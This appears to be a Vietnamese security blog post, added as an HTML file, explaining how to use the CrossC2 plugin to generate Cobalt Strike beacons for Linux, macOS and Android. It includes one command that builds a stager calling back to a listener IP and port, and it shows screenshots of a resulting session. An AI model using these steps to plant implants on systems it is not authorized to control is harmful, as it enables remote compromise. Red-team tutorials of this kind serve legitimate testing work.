@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>CrossC2 – Generate CobaltStrike’s Cross-Platform Payload - quactv</title><meta name="Description" content="quactv blog"><meta property="og:title" content="CrossC2 – Generate CobaltStrike’s Cross-Platform Payload" />
+<meta property="og:description" content="Introduce Config  Listener Generate beacon  Gen via command Gen via install plugin     Result References  Introduce   &ldquo;Cobalt Strike is threat emulation software. Execute targeted attacks against modern enterprises with one of the most powerful network attack kits available to penetration testers. This is not compliance testing.&rdquo;
+  Nếu như bạn từng sử dụng Cobalt Strike chắc cũng sẽ biết Cobalt Strike không hỗ trợ điều khiển từ xa Linux, MacOS, Android&hellip; theo mặc định." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/posts/crossc2generate-cross-platform-payload/" /><meta property="og:image" content="http://example.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-11-03T18:17:00&#43;07:00" />
+<meta property="article:modified_time" content="2021-11-03T18:17:00&#43;07:00" /><meta property="og:site_name" content="quactv blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.org/logo.png"/>
+
+<meta name="twitter:title" content="CrossC2 – Generate CobaltStrike’s Cross-Platform Payload"/>
+<meta name="twitter:description" content="Introduce Config  Listener Generate beacon  Gen via command Gen via install plugin     Result References  Introduce   &ldquo;Cobalt Strike is threat emulation software. Execute targeted attacks against modern enterprises with one of the most powerful network attack kits available to penetration testers. This is not compliance testing.&rdquo;
+  Nếu như bạn từng sử dụng Cobalt Strike chắc cũng sẽ biết Cobalt Strike không hỗ trợ điều khiển từ xa Linux, MacOS, Android&hellip; theo mặc định."/>
+<meta name="application-name" content="quactv blog">
+<meta name="apple-mobile-web-app-title" content="quactv blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/posts/crossc2generate-cross-platform-payload/" /><link rel="prev" href="http://example.org/posts/my-note-for-code-review/" /><link rel="next" href="http://example.org/posts/introduce-java-serialize/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "CrossC2 – Generate CobaltStrike’s Cross-Platform Payload",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/posts\/crossc2generate-cross-platform-payload\/"
+        },"genre": "posts","keywords": "Tool","wordcount":  430 ,
+        "url": "http:\/\/example.org\/posts\/crossc2generate-cross-platform-payload\/","datePublished": "2021-11-03T18:17:00+07:00","dateModified": "2021-11-03T18:17:00+07:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "quactv"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="quactv">&gt; root@quactv:~#</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/write-up/"> Write-up </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About me </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="quactv">&gt; root@quactv:~#</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/write-up/" title="">Write-up</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About me</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">CrossC2 – Generate CobaltStrike’s Cross-Platform Payload</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>quactv</a></span>&nbsp;<span class="post-category">included in <a href="/categories/offensive-security/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Offensive Security</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-11-03">2021-11-03</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;430 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="true">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduce">Introduce</a></li>
+    <li><a href="#config">Config</a>
+      <ul>
+        <li><a href="#listener">Listener</a></li>
+        <li><a href="#generate-beacon">Generate beacon</a></li>
+      </ul>
+    </li>
+    <li><a href="#result">Result</a></li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><ul>
+<li><a href="#introduce" rel="">Introduce</a></li>
+<li><a href="#config" rel="">Config</a>
+<ul>
+<li><a href="#listener" rel="">Listener</a></li>
+<li><a href="#generate-beacon" rel="">Generate beacon</a>
+<ul>
+<li><a href="#gen-via-command" rel="">Gen via command</a></li>
+<li><a href="#gen-via-install-plugin" rel="">Gen via install plugin</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#result" rel="">Result</a></li>
+<li><a href="#references" rel="">References</a></li>
+</ul>
+<h2 id="introduce">Introduce</h2>
+<ul>
+<li>
+<p>&ldquo;Cobalt Strike is threat emulation software. Execute targeted attacks against modern enterprises with one of the most powerful network attack kits available to penetration testers. This is not compliance testing.&rdquo;</p>
+</li>
+<li>
+<p>Nếu như bạn từng sử dụng Cobalt Strike chắc cũng sẽ biết Cobalt Strike không hỗ trợ điều khiển từ xa Linux, MacOS, Android&hellip; theo mặc định.</p>
+</li>
+<li>
+<p>CrossC2 là một plugin mở rộng hỗ trợ Cobalt Strike điều khiển từ xa các máy chủ Linux, MacOS, Android&hellip;.Nó hỗ trợ các thư viện động do người dùng chỉ định, tải, thực thi các thư viện này.</p>
+</li>
+<li>
+<p>Bạn có thể xem chi tiết về dự án tại đây: <a href="https://github.com/gloxec/CrossC2">https://github.com/gloxec/CrossC2</a></p>
+</li>
+</ul>
+<h2 id="config">Config</h2>
+<h3 id="listener">Listener</h3>
+<ul>
+<li>
+<p>Đầu tiên chúng ta sẽ tạo một listener để lắng nghe kết nối từ xa</p>
+</li>
+<li>
+<p>Cobalt Strike -&gt; Listener</p>
+</li>
+<li>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/listener.PNG"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/listener.PNG, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/listener.PNG 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/listener.PNG 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/listener.PNG"
+        title="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/listener.PNG" /></p>
+</li>
+<li>
+<p>Một điều đáng chú ý ở đây là CrossC2 hiện tại chỉ hỗ trợ Beacon Https. Vậy ta sẽ tạo Beacon HTTPS. Đối với các Beacon khác như HTTP sẽ không thể nhận kết nối.</p>
+</li>
+</ul>
+<h3 id="generate-beacon">Generate beacon</h3>
+<ul>
+<li>Ở đây sẽ có 2 phương phương pháp. Chúng ta có thể gen trực tiếp từ binaries mà tác giả đã compile bằng command hoặc install vào Cobalt Strike như một plugin phụ trợ để gen theo dạng Gui. Mình sẽ làm theo cả 2 cách:</li>
+</ul>
+<h4 id="gen-via-command">Gen via command</h4>
+<ul>
+<li>
+<p>Đầu tiên chúng ta sẽ tải binary về tại đây: <a href="https://github.com/gloxec/CrossC2/releases">https://github.com/gloxec/CrossC2/releases</a></p>
+</li>
+<li>
+<p>Cách sử dụng tác giả cũng đã nói rất chi tiết:</p>
+</li>
+<li>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/binary.PNG"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/binary.PNG, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/binary.PNG 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/binary.PNG 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/binary.PNG"
+        title="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/binary.PNG" /></p>
+</li>
+<li>
+<p>Vì phiên bản Cobalt Strike đang sử dụng là 4.4 nên để gen payload tôi sử dụng lệnh sau:</p>
+</li>
+<li>
+<p><code>./genCrossC2.Linux IP_Listener 4444 .cobaltstrike.beacon_keys null Linux x64 ./beacon_linux_test stager 4.4</code></p>
+</li>
+<li>
+<p>cobaltstrike.beacon_keys: được tạo trong cùng thư mục root của Cobalt Strike server khi tạo Listener từ đầu</p>
+</li>
+<li>
+<p>Sau khi chạy lệnh thành công tôi nhận được beacon mới trong thư mục hiện tại:</p>
+</li>
+<li>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/beacon.PNG"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/beacon.PNG, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/beacon.PNG 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/beacon.PNG 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/beacon.PNG"
+        title="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/beacon.PNG" /></p>
+</li>
+</ul>
+<h4 id="gen-via-install-plugin">Gen via install plugin</h4>
+<ul>
+<li>
+<p>Đầu tiên chúng ta sẽ tải về:</p>
+</li>
+<li>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/save.PNG"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/save.PNG, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/save.PNG 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/save.PNG 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/save.PNG"
+        title="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/save.PNG" /></p>
+</li>
+<li>
+<p>Và đừng quên tải xuống: <a href="https://github.com/gloxec/CrossC2/blob/cs4.1/CrossC2Kit/CrossC2Kit_Loader.cna">https://github.com/gloxec/CrossC2/blob/cs4.1/CrossC2Kit/CrossC2Kit_Loader.cna</a> (including memory loading and other functions)</p>
+</li>
+<li>
+<p>Trong CrossC2.cna chúng ta sẽ chỉnh sửa lại path đến binary gen payload và cobaltstrike.beacon_keys cho phù hợp:</p>
+</li>
+<li>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/edit.PNG"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/edit.PNG, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/edit.PNG 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/edit.PNG 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/edit.PNG"
+        title="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/edit.PNG" /></p>
+</li>
+<li>
+<p>Sau đó chúng ta sẽ tải plugin vào Cobalt Strike: Cobalt Strike -&gt; Script Manager -&gt; Load. Sau khi load xong chúng ta sẽ có thêm chức năng CrossC2 trên thanh Menu. Lúc này ta có thể sử dụng để gen payload:</p>
+</li>
+<li>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/menu.PNG"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/menu.PNG, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/menu.PNG 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/menu.PNG 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/menu.PNG"
+        title="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/menu.PNG" /></p>
+</li>
+<li>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/gen.PNG"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/gen.PNG, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/gen.PNG 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/gen.PNG 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/gen.PNG"
+        title="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/gen.PNG" /></p>
+</li>
+</ul>
+<h2 id="result">Result</h2>
+<ul>
+<li>
+<p>Sau khi download và thực thi payload tạo dựa trên command hay GUI trên máy chủ Linux:</p>
+</li>
+<li>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/run.PNG"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/run.PNG, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/run.PNG 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/run.PNG 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/run.PNG"
+        title="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/run.PNG" /></p>
+</li>
+<li>
+<p>Chúng ta có thể làm tương tự để nhận kết nối tự MacOS, Android&hellip;</p>
+</li>
+</ul>
+<h2 id="references">References</h2>
+<p>-<a href="https://gloxec.github.io/CrossC2/zh_cn/usage/genCross.html" target="_blank" rel="noopener noreffer ">https://gloxec.github.io/CrossC2/zh_cn/usage/genCross.html</a></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-11-03</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.org/posts/crossc2generate-cross-platform-payload/" data-title="CrossC2 – Generate CobaltStrike’s Cross-Platform Payload" data-via="quactv1" data-hashtags="Tool"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/posts/crossc2generate-cross-platform-payload/" data-hashtag="Tool"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.org/posts/crossc2generate-cross-platform-payload/" data-title="CrossC2 – Generate CobaltStrike’s Cross-Platform Payload"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.org/posts/crossc2generate-cross-platform-payload/" data-title="CrossC2 – Generate CobaltStrike’s Cross-Platform Payload"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.org/posts/crossc2generate-cross-platform-payload/" data-title="CrossC2 – Generate CobaltStrike’s Cross-Platform Payload"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/tool/">Tool</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/my-note-for-code-review/" class="prev" rel="prev" title="My Notes on Code-Review"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>My Notes on Code-Review</a>
+            <a href="/posts/introduce-java-serialize/" class="next" rel="next" title="[Java Deserialization] Thảo luận về cơ chế Serialize và Deserialize trong Java">[Java Deserialization] Thảo luận về cơ chế Serialize và Deserialize trong Java<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">quactv</a></span>&nbsp;|&nbsp;<span class="license">Infosec</span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                    <span class="icp">Security</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
